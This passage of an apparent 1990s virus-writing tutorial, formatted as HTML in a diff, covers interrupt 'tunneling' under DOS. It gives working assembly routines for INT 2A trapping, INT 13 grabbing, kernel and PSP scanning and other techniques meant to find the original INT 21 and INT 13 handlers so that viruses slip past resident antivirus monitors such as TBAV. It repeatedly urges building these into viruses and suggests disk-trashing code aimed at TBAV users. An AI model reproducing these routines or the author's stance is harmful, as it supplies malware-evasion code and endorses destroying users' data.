+<p>Also, you can use the code tracing engine to tunnel the i20 handler, which eventually leads to the the i21 handler. The reason why is, whatever program has trapped i20, it simply changes AX to 0000 and then chains to the i21 handler. DESQView, TBAV, and even DOS itself do this. HOWEVER, if TBAV or DESQView isn't loaded, then DOS gets control first, and its conversion from i20-i21 procedure is a few bytes below/above the i21 procedure itself in the DOS kernel... which means the code tracer will think the second it reaches the DOS kernel, that it has found the i21 entrypoint, when it is a few instructions away. Sigh. You can get around this by checking ES:DI each pass for the signature of the DOS kernel entrypoint, (which is CLI/CMP/JZ/CMP/JZ/etc, you'll read more about it through the document), instead of checking if the current segment is below the first MCB. Apart from that, the routine tunnels through the TBAV/DESQView code properly every time, reaching the correct i21 address.</p>
+<p>In short, the results of the new code tracing engine are impressive, as it is very successfull in tunneling i21, i20, and i13, unless DESQView is running, in which case the i13 tunneler doesn't work. Of course, the only improvements weren't in how well the code tracer works... I also strove to decrease size requirements as well:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="size requirements">
+<tr><td>Module </td><td>CT #1</td><td>CT #2</td><td>Space saved</td></tr>
+<tr><td>CMT decoder </td><td>216 b</td><td>135 b</td><td>81 bytes</td></tr>
+<tr><td>CMT instruction database</td><td>253 b</td><td>134 b</td><td>119 bytes</td></tr>
+<tr><td>Code Tracing Engine </td><td>528 b</td><td>404 b</td><td>124 bytes</td></tr>
+<tr><td>Total </td><td>997 b</td><td>673 b</td><td>324 bytes</td></tr>
+</table>
+<p>So as you can see, we've dropped 1/3 of the code in the code tracing engine itself, as well as making our CMT tables and decoder nearly half the size of the original versions, ending up with our new complete code package average 2/3's the size of the original... not too bad. Of course, you could probably still trim the code size down with some dirty optimizations. By moving some of the opcodes in the CMT instruction database inline into the code tracing engine, like I have done with the jump/call direct access instructions, you could probably save an extra 30 or so bytes. But this document is about tunneling, not how to optimize your code :)</p>
+<h2><a name="p2">Section 2: INT 2A trapping</a></h2>
+<p>i2A trapping was created many years ago, and as far as I know, at least 2 viruses use it... CHAOS-AD by Sepultura [IR/G], which was printed in IR#7, and Assassin by Dark Slayer (of Taiwaan), which was printed in 40HEX. I don't know who created it first, but Sepultura has said that he created it independantly.</p>
+<h3>How it works</h3>
+<p>Inside the DOS kernel i21 handler, there is an INT 2A instruction, which is executed near the end of DOS's processing of most of the different i21 functions. Anyway, i2A generally points to an IRET, or networking code, or some sneaky AV programs. Sigh, I suppose sometimes DOS may hook it for its own uses too, but I'm getting off the track.</p>
+<p>To tunnel i21, you simply hook i2A into your virus, and then, execute a DOS i21 function. The DOS kernel then calls i2A later on, transferring control to your handler, with the CS:IP of the i2A call still on the stack. Then, you scan through DOS's segment for the marker of an i21 kernel entrypoint (CLI/CMP AH/etc), save the addresses, restore control to the proper i2A, and then on exit from the i21 handler, you have the original i21 entrypoint.</p>
+<h3>Example</h3>
+<pre class="source">
+orig_21 dw 0, 0
+orig_2a dw 0, 0
+
+tunneler proc near
+    xor ax, ax
+    mov ds, ax
+    les ax, ds:[(02ah*4)]
+    mov cs:[orig_2a], ax
+    mov cs:[orig_2a+2], es      ; save old 2A handler
+    cli
+    mov word ptr ds:[(02ah*4)], offset new_2a_handler
+    mov ds:[(02ah*4)+2], cs     ; write new handler
+    sti
+    mov ah, 052h
+    int 021h                    ; execute any old INT 21 function
+    les ax, dword ptr cs:[orig_2a]
+    cli
+    mov ds:[(02ah*4)], ax
+    mov ds:[(02ah*4)+2], es     ; restore old handler
+    sti
+    ret                         ; exit routine
+tunneler endp
+
+new_2a_handler proc far
+    push bp
+    mov bp, sp
+    push ax
+    push es
+    push di
+    push cx                     ; save registers
+    mov cx, -1
+    les di, [bp+2]              ; set ES:DI to return address
+    std                         ; scan backwards
+    mov al, 0fah                ; 'CLI'
+
+int_2a_loop:
+    scasb
+    je int_2a_scan_okay         ; exit if CLI found
+    loop int_2a_loop            ; keep scanning
+int_2a_scan_error:
+    mov word ptr cs:[orig_21], 0
+    mov word ptr cs:[orig_21+2], 0
+    jmp exit_2a_handler         ; abort if no CLI in whole segment
+int_2a_scan_okay:
+    cmp word ptr es:[di+2], 0FC80h
+    jne int_2a_loop
+    inc di                      ; SCASB fixup
+    mov cs:[orig_21], di
+    mov cs:[orig_21+2], es      ; save CLI's CS:IP (ES:DI)
+exit_2a_handler:
+    mov ax, [bp+6]
+    push ax
+    popf                        ; restore proper flags
+    pop cx
+    pop di
+    pop es
+    pop ax
+    pop bp                      ; restore modified registers
+    jmp dword ptr cs:[orig_2a]  ; hand control back to original 2A handler
+new_2a_handler endp
+</pre>
+<h3>Problems</h3>
+<p>There are a few problems with i2A trapping, and kernel scanning (looking for the CLI/CMP AH, XX/etc, signature). There's a discussion on problems with kernel scanning at the end of the document so you can look there for the problems with it, in here we'll just discuss i2A specific problems.</p>
+<p>When DOS is in the HMA, your i2A trapper will always return the address of the entrypoint in the HMA. Now, we all know that the HMA can be, and is, turned on and off at will by other programs, which means that sometimes, when you call the original i21 in the HMA, the HMA won't be available and your virus will crash the computer.</p>
+<p>Also, there are a few ways to specifically stop i2A trapping, all which require you to be hooked into i21 yourself. The easiest method, would be to, in your handler, after executing the original i21, to call i2A again, and have a fake CLI/CMP in your own segment to fake the DOS entrypoint signature. This may, however, cause some problems for programs which specifically hook into i2A to handle specific tasks, etc, which may become confused. A smarter method would be to, on entry to i21, replace i2A with a null IRET handler, and then execute the original i21, before returning the i2A to its proper value. Once again, this may cause problems with other programs which hook i2A for specific tasks.</p>
+<h3>How does it size up?</h3>
+<p>Well, basically, anti-i2A code isn't really present in any commercial AV TSR software. However, there are the problems associated with the DOS kernel scanning... such as network incompatability, etc, which you'll read about much later in the document. However, generally speaking, apart from the dos kernel scanning problems, the routine seems to work pretty much okay on most systems I've seen so far.</p>
+<h2><a name="p3">Section 3: Grabbing i13 from the DOS kernel</a></h2>
+<p>This backdoor was first seen in many of the bulgarian viruses from long ago when Bulgaria was the virus writing capital of the world (well, supposedly anyway).</p>
+<h3>The info (from Ralph Brown)</h3>
+<blockquote><pre>
+INT 2F - DOS 3.2+ - SET DISK INTERRUPT HANDLER
+        AH = 13h
+        DS:DX -&gt; interrupt handler disk driver calls on read/write
+        ES:BX = address to restore INT 13 to on system halt (exit from root
+                 shell) or warm boot (INT 19)
+Return: DS:DX set by previous invocation of this function
+        ES:BX set by previous invocation of this function
+Notes:  IO.SYS hooks INT 13 and inserts one or more filters ahead of the
+          original INT 13 handler.  The first is for disk change detection
+          on floppy drives, the second is for tracking formatting calls and
+          correcting DMA boundary errors, the third is for working around
+          problems in a particular version of IBM's ROM BIOS
+        before the first call, ES:BX points at the original BIOS INT 13; DS:DX
+          also points there unless IO.SYS has installed a special filter for
+          hard disk reads (on systems with model byte FCh and BIOS date
+          &quot;01/10/84&quot; only), in which case it points at the special filter
+        most DOS 3.2+ disk access is via the vector in DS:DX, although a few
+          functions are still invoked via an INT 13 instruction
+</pre></blockquote>
+<h3>Example</h3>
+<pre class="source">
+orig_21 dw 0, 0
+
+grab_13 proc near
+    mov ah, 013h
+    int 02fh                    ; grab original i13 handler addresses
+    push es
+    push bx                     ; save address we want on the stack
+    mov ah, 013h
+    int 02fh                    ; restore original addresses (as they were
+                                ; corrupted on the first call)
+    pop bx
+    pop es
+    mov cs:[orig_13], bx
+    mov cs:[orig_13+2], es      ; save original i13 address in a variable
+    ret                         ; exit
+grab_13 endp
+</pre>
+<h3>Commentary</h3>
+<p>As you can already imagine, this method, although sounding fairly secure, is probably the worst possible way to tunnel :) Since it was utilized in the 80's, a time when AV manufacturers had time to actually dissassemble and understand each and every single (rare) virus they were given, the AV people already know this trick, and a few trap this call in their TSR modules and return the address to their own i13 handler code (TBDRIVER is one example, more about it in the next section). If it wasn't for the vulnerability to AV software, this method would be practically guaranteed to work as it is a documented function of DOS.</p>
+<h2><a name="p4">Section 4: DOS kernel scanning for i13</a></h2>
+<p>Since the very beginning of DOS, segment 70H has been used for all of its disk processing functions. Luckily for us, the original BIOS address of i13 is stored at 70:B4... however, if we were to just use the value at this address, we could run into problems in new and old DOS versions which may change the location. So, by scanning through segment 70h for a CALL DWORD PTR [00B4]... if we find one, then we know the value at 70:B4 is valid for usage. The author of 'Creeping Death' was the first that I know of to utilize this method. Time for a pre-coded example.</p>
+<h3>Example</h3>
+<pre class="source">
+kernel_13 proc near
+    mov ax,70h
+    mov ds,ax
+    mov si, 1
+kernel_13_loop:
+    cmp si, 0
+    je kernel_13_abort      ; exit when we've finished total scan
+
+    dec si
+    lodsw                   ; get data from DS:SI
+
+    cmp ax,1effh            ; is it the CALL FAR [X]?
+    jne kernel_13_loop      ; nope, keep scanning
+
+    cmp word ptr ds:[si],0b4h
+    jne kernel_13_loop
+
+    mov si, 0b4h
+    push ds:[si]
+    pop cs:[orig_13]
+    push ds:[si+2]
+    pop cs:[orig_13+2]
+    clc
+    ret
+kernel_13_abort:
+    mov cs:[orig_13], 0
+    mov cs:[orig_13+2], 0
+    stc
+    ret
+kernel_13 endp
+</pre>
+<h3>Problems</h3>
+<p>This routine has also been around for a long time, just like the last i13 grabbing method... however, no AV program I know of traps it. Trapping such a routine is -VERY- easy... simply check that 70:B4 is valid for yourself, then switch the value there with the address of your own own i13 handling code, which means that all i13 access will be redirected to your handler where you can check for writes to track 0, etc. You yourself could, however, bypass this by making sure the segment of the address at 70:B4 is F000 (BIOS segment) or C800 (old XT DISK BIOS segment) before using it (which TBDRIVER stops... read the info below this). To make all these attempts futile, the AV can replace the CALL FAR with an INT xx which calls their own i13 handling code, which then gives control over to the address stored in 70:B4 once all the tests for virus-like behaviour have been done.</p>
+<h3>How good is it?</h3>
+<p>Strangely enough, TBDRIVER points the value at 70:B4 to its own code... however in effect, this code is null, simply passing control to the proper original handler. Sigh, I think its there so if you test the address at 70:B4 for the BIOS i13 handler segment... the test will fail and you will think the address is invalid... when in reality it is perfectly valid. Oh well. Apart from that... which is basically no problem at all, this routine should work a majority of the time.</p>
+<h2><a name="p5">Section 5: DOS terminate backdoor</a></h2>
+<p>This is one of the most obscure of tunneling methods I have been told of to date, and I haven't seen any viruses which use it specifically. Not many people seem to know about it, probably because it is the least efficient of all the methods presented so far ;)</p>
+<h3>What is it?</h3>
+<p>You may remember old faithfull interrupt 20, DOS's now obselete function for program termination. Well, due to the way DOS is set up, sometimes the address of i20 can help us track down the original DOS kernel entrypoint to the i21 handler.</p>
+<p>When DOS is loaded into low memory on bootup, i20 points to the DOS code segment, and not many programs hook into i20, and definately no normal run of the mill TSR's will hook into it, so generally speaking, i20 is always pointing to the DOS code segment, which means we could do kernel scanning for the CLI/CMP pair.</p>
+<p>But wait, what if DOS is loaded high? Well that is even better for us, because the i20 points to a FAR JMP, followed by another FAR JMP, and (at least on my system), is followed by an IRET, with the second FAR JMP being a direct JMP to the i21 entrypoint! So, in memory, things will look like this.</p>
+<pre class="source">
+    i20_entrypoint:
+        JMP FAR xxxx:xxxx       ; jumps a few bytes below i21 entrypoint
+        JMP FAR xxxx:xxxx       ; jumps directly to i21 entrypoint
+        IRET
+</pre>
+<p>Alternatively, you can tunnel i20 itself and scan for the i21 CLI/CMP pair, however you'd have to do this with code tracing, rather than emulation or single stepping, because executing i20 will terminate the currently running program or, alternatively, just bugger things up.</p>
+<p>The biggest problem with tunneling with this method... is working out wether DOS is loaded high or low... because if you think it is loaded low, but i20 has really been hooked by another program, then searching for the CLI/CMP pair could cause you to misfire badly. On my system, i20 always points to below the first MCB, wether DOS is high or low, so my example routine assumes if this is not the case, then i20 has been hooked. Things may be different on other people's systems however, so you may want to check around your own i20.</p>
+<h3>Example time!</h3>
+<pre class="source">
+i20_exploit proc near
+    mov ax, 3520h
+    int 21h
+    mov ax, es
+    mov ds, ax
+    mov si, bx              ; point DS:SI to i20
+    cmp ax, cs:[first_mcb]
+    jae i20_hooked
+i20_high:
+    cmp byte ptr ds:[si], 0eah
+    jne i20_low             ; check for first JMP FAR
+    add si, 5
+    cmp byte ptr ds:[si+5], 0cfh
+                            ; check for IRET (maybe this should be left out)
+    jne i20_hooked
+    cmp byte ptr ds:[si], 0eah
+                            ; check for second JMP FAR
+    jne i20_hooked
+    inc si
+    lds si, ds:[si]
+    mov cs:[orig_21], si
+    mov cs:[orig_21+2], ds
+    clc
+    ret
+i20_hooked:
+    mov word ptr cs:[orig_21], 0
+    mov word ptr cs:[orig_21+2], 0
+    stc
+    ret
+i20_low:
+    push ds
+    pop es
+    mov cx, -1
+    std                         ; scan backwards
+    xor di, di                  ; bleh :)
+    mov al, 0fah                ; 'CLI'
+
+i20_scan_loop:
+    scasb
+    je i20_scan_okay            ; exit if CLI found
+    loop i20_scan_loop          ; keep scanning
+i20_scan_error:
+    mov word ptr cs:[orig_21], 0
+    mov word ptr cs:[orig_21+2], 0
+    stc
+    ret                         ; exit if no CLI found
+i20_scan_okay:
+    cmp word ptr es:[di+2], 0FC80h
+    jne i20_scan_loop
+    inc di                      ; SCASB fixup
+    mov cs:[orig_21], di
+    mov cs:[orig_21+2], es      ; save CLI's CS:IP (ES:DI)
+    clc
+    ret                         ; exit happily
+i20_exploit endp
+</pre>
+<h3>Bzzt! Lie detected!</h3>
+<p>Okay okay, so I lied earlier on when I said not many programs hook i20. Well, it was actually a half-truth. Not many programs DO hook i20, however, a few very major programs DO hook it :) DESQView and Windows definately hook it, and generally, any shell program or multitasking program would hook into it. Anything which needs to control programs might hook it, so this includes viruses, which sometimes use i20 in tricky ways to go resident past AV tsr software :) However, generally, these viruses restore i20 to its proper value once their work has been done, which means unless the program your tunneler is executing from has a copy of a virus which isn't resident, but is using i20 techniques to go resident, the chances of conflicting are minimal.</p>
+<h3>But is it reliable?</h3>
+<p>Not many VX people know about this technique, let alone AV people! I have never seen this technique in a virus, so I doubt very much that any AV out there traps it. Even if they do, they'll have to fool your specific way of checking if it is a real DOS i20 or if it has been hooked, and they'd have to emulate the code signatures you check for, etc, etc.</p>
+<p>So, although it is reliable from a standpoint of not being detectable by AV software, it is not very reliable speaking from a 'per-system success rate' point of view... since alot of people run DESQView/Windows/etc. However, if the pointers for i20 ARE correct, then you've got a good routine to find i21! So, you may want to include these routines in your virus anyway, along with another i21 tunneling method as a backup in case this one fails.</p>
+<h2><a name="p6">Section 6: CP/M utilization</a></h2>
+<p>There was an extensive document written about this tunneling method in VLAD#3, so if you don't understand my version of how to utilize this backdoor, then feel free to go fuck yourse... I mean, uuuh, go read the other version :)</p>
+<h3>CP/M?</h3>
+<p>Back in the days before DOS, the predominant operating system of the time was CP/M. When Bill Gates created DOS 1.0 for marketing on the IBM PC, he wanted to make DOS look attractive to buyers by making it easy for people to port their CP/M code into his DOS operating system, and since DOS is very backwards-compatable, through the many upgrades of DOS there are still a few (now, totally obselete) functions still retained from the CP/M compatable bits, namely, the CP/M function dispatcher.</p>
+<p>The code for this dispatcher is stored very close to the handler for i21, inside the kernel, because the CP/M handler actually uses the i21 handler to do its dirty work (it converts its calls into i21 calls). Anyway, if we can tunnel into the CP/M handler, using either code tracing or single step mode, or even possibly if the CP/M handler hasn't been modified and still points to the DOS kernel, we can try to deduce the i21 beginning.</p>
+<p>Anyway, because of the wierd way CP/M operates, there is no real interrupt to call for its routines, there are only entrypoints, of which there are two, stored in different places. First, there is the data at i30, which is a JMP FAR off:seg, and the data in the PSP at offset 5, which is a CALL FAR off:seg.</p>
+<p>Unfortunately for us, some AV programs would purposely corrupt the i30 entry, which is created on bootup by DOS, and apart from this, thanks to DOS and DESQView, the entry in the PSP is usually corrupted! In some DOS versions, it points to the correct address, in some it points 2 bytes too low, and under DESQView, it points (from the version I have) 12 bytes too low. Anyway, using either entry is too much hassle, because of corruption, so, what can you do?</p>
+<p>The answer is simple, there is only one true entry you can rely upon, and that is stored somewhere in memory in the PSP of the original shell (usually COMMAND.COM) itself. How do we find this? At offset 16h in the current PSP, is the segment address of the PSP of the calling program. Every (valid) chain of PSP's eventually leads to COMMAND.COM or whatever processor the user is using, and from there you can get the real CP/M entrypoint, from the shell's PSP.</p>
+<h3>Marker bytes</h3>
+<p>There are two sets of marker bytes that can be at the original kernel i21 entrypoint. When raw DOS or QEMM is loaded, the marker is 'FA80', with the '1E1E' marker of the CP/M code 025h bytes below this position. When EMM386 is loaded, the kernel i21 handler precedes the CP/M handler by 032h bytes, with both having the marker of '9090, E8'.</p>
+<p>Generally, PSP tracers go through and check for the CP/M marker bytes, and then guess at the correct location of i21 from there... which generally works under DOS/QEMM/HIMEM.SYS. However, when you loadup DESQView or Windows, they replace the DOS CP/M call with their own code, which then chains onto their own i21 handlers, which later chain onto the DOS i21 handlers... causing the former marker bytes to become invalid.</p>
+<p>However, no matter what, in the end everything is translated down to the DOS kernel i21 calls, so, if you check for the i21 entrypoint marker bytes, and -THEN- check for CP/M bytes in their proper position, then you will work under DOS/QEMM/HIMEM/WINDOWS/DESQVIEW software and this is a good thing[tm]. BUT, even then there are PROBLEMS! ARGH! The pure DOS version of the CP/M handler doesn't chain directly onto the i21 handler... it chains a few bytes AFTER the CLI/CMP AH, XX/etc, directly to a CMP/JE instruction. Of course you -COULD- check for this, but it would require alot of messing about to make sure you are right in all circumstances.</p>
+<p>However, to do that, you need to have a stable method of tracing through all the junk code that programs like DESQView/Windows use for their interrupt handlers, and as of now, you don't have that technology. Why? Because code tracing is the only method you know of so far, and it is in no way stable enough to trace through something like DESQView (trust me, I tried). Emulation could possibly be an alternative, but you don't know about emulation technology yet :)</p>
+<p>So what are your choices? Well, you have two. Because of the way the DOS CP/M handler is set up, there SHOULD be a chain of JMP FAR off:seg instructions from the CP/M entrypoint you get, to the real entrypoint near the DOS i21 kernel. If the CP/M chain has been tapped into however, there will be no chain, or it will lead somewhere else where there won't be the correct marker signature bytes that you'll be scanning for.</p>
+<p>Alternatively, you could use single stepping. Now, this is not such a bad idea, at least, at first glance. However, there are a few things you have to be very very carefull of if you chose this technique that I'll tell you about later. If you -DO- use this technique, then you need to know how to use the CP/M entrypoint you got from COMMAND.COM's entrypoint.</p>
+<p>To execute a CP/M call is fairly tricky. Only DOS i21 functions below 024h can be ran, and instead of being in AH they are in CL. Also, CP/M calls always corrupt AX, and possibly a few other registers. Anyway, to do a CP/M call, you push your return IP onto the stack, followed by your return CS, followed by the flags (yes, the stack is backwards, ip, cs, flags), and then jump to the CP/M entrypoint. So, simply do your single step mode routines as usual, and checl for the proper markers along the way.</p>
+<h3>Example code</h3>
+<p>This example uses a quick method of climbing up the PSP chain to get to the command shell's PSP, and then getting the CP/M entrypoint from there. After this, it follows any FAR JMP's as far as possible, but once the FAR JMP's have stopped, it immediately checks for the magic marker bytes, meaning this technique will not work under DESQView or anything else which hooks into the CP/M chain of command.</p>
+<pre class="source">
+   ;; on entry, make sure DS==PSP address
+   ; returns DS:SI as i21 address
+   ; carry clear on success, carry set on failure
+   ;
+   tunnel_cpm proc near
+       mov ax, ds:[016h]
+       mov bx, ds
+       cmp ax, bx
+       je psp_end
+       cmp ax, 0
+       je psp_end
+       mov ds, ax
+       jmp tunnel_cpm
+    
+   psp_end:
+       mov si, 5
+    
+   jump_loop:
+       lds si, ds:[si+1]
+       cmp byte ptr ds:[si], 0eah
+       je jump_loop
+    
+   check_first_magic:
+       cmp word ptr ds:[si], 9090h
+       jne check_second_magic
+       sub si, 32h
+       cmp word ptr ds:[si], 9090h
+       jne tunnel_error
+    
+   tunnel_success:
+       clc
+       ret
+    
+   check_second_magic:
+       cmp word ptr ds:[si], 2e1eh
+       jne tunnel_error
+       add si, 25h
+       cmp word ptr ds:[si], 80fah
+       je tunnel_success
+    
+   tunnel_error:
+       stc
+       ret
+   tunnel_cpm endp
+</pre>
+<h3>Aaaaaaaaargh</h3>
+<p>That will be your reponse when you run this code under TBAV :) TBAV (7.06 at least, but probably long before that as well) is very mean when it comes to CP/M calls, replacing not only the i40 and PSP values with junk (although not COMMAND.COM's), but OVERWRITING the ORIGINAL entry to the CP/M calls with an i20! Need I even mention the incompatability horrors that this has and will create for old programs, CP/M emulators, etc? TBAV doesn't even give you an error message, it just brutally quits the running program. How naughty.</p>
+<p>This is why I advised against using single step tunnelers to do your dirty work :) You -COULD- simply check for an 'int 20' in your single step handling code... sure... that would be easy. As far as I know, tunneling the CP/M handlers with single step mode is very reliable as long as you check for the i20. However, remember, TBAV might like to change the i20 one day into a AH=4C/INT 21 :)</p>
+<p>Should TBAV CP/M killer code be encountered, you may like to tunnel another interrupt, say, oh, I don't know, i13 maybe, trashing the hard disk, and giving the user an error message from DOS, complaining about bad CP/M dispatch handlers, and finally, of course, giving you the names of the bad program which is responsible, TBDRIVER.EXE, and asking you to ring the 'product developer' for more information. ROFL. I can just imagine some poor loser ringing up thunderbyte support and saying that his hard disk has dissapeared while he was running TBAV... and that there was some error about bad CP/M handlers.... :)</p>
+<p>Normally I don't condone disk-trashing code... but BLATANT disregard for software compatability such as that shown by thunderbyte is just unacceptable in my books. Just stopping a program dead in its tracks... how brutal.</p>
+<p>Programs have rights too you know</p>
+<h3>Reliability?</h3>
+<p>Yes, this routine is very reliable. Well, once again, it really depends on what we're talking about... sure, this routine, if it works, is VERY reliable, and it is very unlikely your routine will be caught out by resident AV software, as for how successfull it is in the real world, I'd think probably about as reliable as the i20 trick. Basically, it will definately NOT hurt your virus including a routine such as this.</p>
+<h2><a name="p7">Section 7: Uuuuuh, SFT tunneler?</a></h2>
+<p>Okay, so, I don't exactly understand WHY this routine works, but, well, it does, shrug. It was allegedly created by the STEALTH group, and included in a virus called Killer, which was printed in VLAD#7.</p>
+<h3>The code</h3>
+<pre class="source">
+   stealth proc near
+       cld
+       mov ah, 52h
+       int 21h             ; get DOS list-of-lists
+       lds si, es:[bx+4]   ; DS:SI = DOS SFT tables
+       lds si, ds:[si-4]   ; DS:SI = somewhere in the DOS code segment?
+   stealth_loop:
+       dec si
+       cmp word ptr ds:[si], 0e18ah
+       jne stealth_loop    ; MOV AH, CL
+       cmp byte ptr ds:[si+2], 0ebh
+       jne stealth_loop    ; JMP SHORT
+   stealth_calculate:
+       lodsb
+       cmp al, 0fah
+       jne stealth_calculate   ; search for DOS kernel entrypoint CLI
+       dec si
+       mov cs:[orig_21], si
+       mov cs:[orig_21+2], ds
+       ret                     ; save addresses and exit
+   stealth endp
+</pre>
+<h3>Huh?</h3>
+<p>Yeah, that was my response too. I seem to have most of it worked out however. What it does, is somehow find the DOS code segment, the address of which is stored at the dword below the beginning of the SFT tables... and then it begins scanning for the CP/M handler in the kernel, before advancing a few more bytes to find the i21 handler address. The reason they search for the CP/M handler instead of straight out looking for the i21 entrypoint is because searching for both is more reliable... if you want to change the routine to search for the i21 entrypoint straight away, you'll have to use a long match string (4-6 bytes) so that you don't get it confused with all the other junk in the DOS code segment.</p>
+<p>What perplexes me is what the hell the address of the original DOS code segment is doing just below the SFT tables. Apart from that, the rest of the routine is easily understood.</p>
+<h3>How reliable is it?</h3>
+<p>To be quite honest, I have no idea :) It seems to work constantly on my system, even under DESQView and DOSDATA.SYS (a rare change). If I only knew what the address pointed to just below the SFT tables was, maybe I could comment more on its reliability. HOWEVER, since this routine uses a modified kernel scanner, it does have the problems associated with kernel scanners, which are discussed later on in the document. STEALTH says that this routine should work on DOS versions 3-7 (Win95)... however they didn't take into account the problems with kernel scanning.</p>
+<h2><a name="p8">Section 8: Double-NOP scanning</a></h2>
+<p>Hehe, sorry, I had to include the weirdest type of tunneler I could find into this document :) Hey, sue me. I've seen this code in the SterCor virus by Yosha, and the Diametric/Matricide virus by Rajaat [IR/G]. They were coded differently but used the same principle to do the tunnel. After having a close look at both codes, they look coded differently enough to warrant my conclusion that they both created the idea independently. In the time-line however, I suspect that Rajaat may have created the routine before Yosha, however Yosha's was released to the public before Rajaat's... however I saw Rajaat's even before Yosha's was released! Sigh. Who cares anyway?</p>
+<h3>How Raajat's works</h3>
+<p>Rajaat's works by finding the DOS data segment (which is contained usually in the DOS code segment) and scanning through for the double-NOP signature of the i21 patch entrypoint. Each double-NOP is followed by a JMP CS:[DWORD MEM] instruction, and he checks the address pointed to by the JMP for the CLI/CMP i21 kernel entrypoint.</p>
+<h3>How Yosha's works</h3>
+<p>Yosha's also finds the DOS data segment (with a different function call) and scans through that segment for the first JMP CS:[DWORD MEM] instruction. Then, it calculates the address of the 2nd JMP CS:[DWORD MEM] after that one, and uses the address pointed to by it, to check for the i21 CLI entrypoint marker.</p>
+<h3>Which is better?</h3>
+<p>Well, this is pretty hard to work out actually ;) Rajaat's is more secure, as it doesn't depend on a fixed constant like Yoshas. HOWEVER, in actuality, the 3rd JMP CS:[DWORD MEM] will always (as far as I know) point to the i21 handler... which means Rajaat's method is slightly redundant :) Although this is the case, redundant code impresses me, so Rajaat wins out ;)</p>
+<h3>Example</h3>
+<pre class="source">
+   rtfm proc near
+       mov ax, 4300h
+       int 2fh
+       cmp al, 80h
+       jne rtfm_error          ; abort if no memory manager
+    
+       mov ah, 52
+       int 21h                 ; ES == DOS data segment
+    
+       push es
+       pop ds
+       xor si, si
+       cld
+    
+   rtfm_loop:
+       lodsw
+       cmp si, -1
+       je rtfm_error           ; abort if entire segment scanned with no result
+       dec si
+       cmp ax, 9090h
+       jne rtfm_loop           ; reloop if no double-NOP signature
+    
+       cmp word ptr ds:[si+4], 0ff2eh
+       jne rtfm_loop           ; no JMP FAR CS: there
+    
+       cmp byte ptr ds:[si+6], 2eh
+       jne rtfm_loop           ; no JMP FAR CS: there
+    
+       mov bx, ds:[si+7]
+       les di, ds:[bx]
+    
+       cmp byte ptr es:[di], 0fah
+       jne rtfm_loop           ; no CLI at entrypoint
+    
+       mov cs:[orig_21], di
+       mov cs:[orig_21+2], es
+       clc
+       ret                     ; save address and exit
+    
+   rtfm_error:
+       mov cs:[orig_21], 0
+       mov cs:[orig_21+2], 0
+       stc
+       ret                     ; clear address and exit
+   rtfm endp
+</pre>
+<h3>How reliable?</h3>
+<p>Well, it's not very reliable, for numerous reasons. Sigh, neither will work under Windows, and neither will work if a memory manager isn't loaded (Rajaat's checks for a memory manager, Yosha's doesn't). Also, neither will work under QEMM if DOSDATA.SYS is being used to free up conventional memory, because DOSDATA.SYS relocates the DOS data segment into upper memory, far far away from the DOS code segment, meaning none of the double-NOP or JMP FAR pointers will be found. Both, being kernel scanners, also have the problems associated with kernel scanners which are discussed in the next section.</p>
+<p>If it wasn't for those problems with kernel scanners, and -IF- DOSDATA.SYS was not being used, the routines would be secure. The good thing is, neither has much chance of returning you a wrong value, so including a tunneler such as these in your viruses wouldn't hurt, as long as you included a few backup tunnelers in case these fail.</p>
+<h2><a name="p9">Section 9: Other tidbits</a></h2>
+<p>There were a few mini-tidbits of information left to tell you, which were too small to fit into normal sections, and also a few notes about things I said in previous documents which proved untrue, etc, etc... you could call them woopsies :) Anyway, here they are :)</p>
+<h3>Kernel scanning</h3>
+<p>Okay, now you know most of the different routines so far... but many of them have something in common... scanning for the dos kernel entrypoint through a certain segment. This is the fundamental basis of most of the techniques you've seen so far. Most of them are simply trying to track down the DOS code segment so they can begin scanning.</p>
+<p>You might be asking yourself how you're supposed to scan :) It's just a term used to describe checking through the whole segment for a set of hex bytes which indicate the entrypoint of the i21 handler. For instance, usually, they are CLI/CMP AH, 6C/JA XX... or, alternatively, NOP/NOP/CALL XX/JMP FAR [XX]. The problem with the second signature, is that the area surrounding it is FULL of ones exactly like it... however you can tell which one is the real one, because it is the 3rd set of double-nop's.</p>
+<h3>Problems with kernel scanning</h3>
+<p>Kernel scanning relies on a certain signature to find the DOS entrypoint. Obviously, DOS versions change, and since normal programs SHOULDN'T be relying on certain DOS code to stay constant... Microsoft couldn't really be blamed for totally rewriting their interrupt handlers and making all old signatures absolutely useless. Hell, they could totally rewrite DOS into a protected mode version for all I know. Anyway, there are quite a few different DOS types out there, DR-DOS, Novell DOS, etc, and you could never be sure all will use the same signature as Microsoft DOS. However, those are only possibilities, the truth of it is, that there is probably never going to be a new DOS version, and that the other types of DOS do use practically the same signatures as the Microsoft version.</p>
+<p>However, there are more problems. Some viruses, anti-viruses, and network software, hook into i21 by overwriting the initial entrypoint with a FAR JMP, FAR CALL, or INT to their own code... and once they are finished, they put the proper code back in the i21 handler, and once the i21 handler has finished, replace the original entrypoint code with their own again. Novell Netware for DOS does this... and I would think that ALOT of people run Novell. Not many AV programs use this method... however quite a few viruses do these days, to prevent detection from resident-AV programs which warn the user when a program hooks an interrupt such as i21.</p>
+<p>By picking the right signatures though, ones which aren't right at the entrypoint and therefore vulnerable to being overwritten, but closeby and not likely to change between the versions of DOS... you could still get away with kernel scanning.</p>
+<h3>i40 and BIOS entrypoints</h3>
+<p>i40 is actually the original BIOS i13 floppy disk handler... which is redirected to the i40 address -IF- and -ONLY IF- a hard disk is present on the system. You can use i40 just like i13, except it won't accept hard disk numbers as paramaters. Make sure you check the i40 address before you use it though, as if there is no hard disk on the system then it will point into nothingness. Oh, and in some BIOS's, the original i13 handler is at F000:EC59, however I wouldn't depend on this too much, considering the number of different BIOS's out there. Mine points there though...</p>
+<p>Another unreliable way of finding the original i13 address in the BIOS is to scan through it for the starter bytes of an i13. Many BIOS's differ, however, generally speaking, they start with a CMP DL, 80... or a TEST DL, 80 followed shortly after by an INT 40. This would not be hard to make a scanner for... however I cannot vouch as to ones reliability or how succesfull one would be.</p>
+<p>It would be alot safer to simply use a good code tracer/emulator to go through the i13 code until it hits segments F000h or C800, where the AT+ and XT i13 entrypoints respectively reside.</p>
+<h3>QEMM plays "Romeo and Juliet"</h3>
+<p>Catchy heading huh? Well, basically, when you have QEMM and DOSDATA.SYS on a system, sometimes they actually work together properly and free up basically all of your lower memory... even memory lower than segment 300. If you think that number sounds familiar, then good... if it DOESN'T sound familiar, you've obviously totally forgotten about tunneling document #1, where I told you how to locate the original i21 handler.</p>
